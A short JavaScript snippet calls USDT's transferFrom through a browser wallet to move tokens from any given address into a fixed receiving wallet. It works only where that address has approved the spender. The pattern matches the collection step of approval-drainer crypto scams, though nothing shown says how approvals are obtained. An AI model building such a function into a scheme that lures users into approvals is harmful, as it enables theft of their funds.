async function withdrawUSDT(fromAddress, amountInUSDT) {
  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: "eth_requestAccounts" });

  const accounts = await web3.eth.getAccounts();
  const yourWallet = accounts[0]; // Must match RECEIVER_ADDRESS

  const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);

  const amount = web3.utils.toWei(amountInUSDT.toString(), "mwei"); // USDT uses 6 decimals

  try {
    const tx = await usdt.methods
      .transferFrom(fromAddress, yourWallet, amount)
      .send({ from: yourWallet });

    console.log("Withdrawal successful:", tx);
    alert("Funds withdrawn successfully.");
  } catch (err) {
    console.error("Withdrawal failed:", err);
    alert("Error withdrawing: " + err.message);
  }
}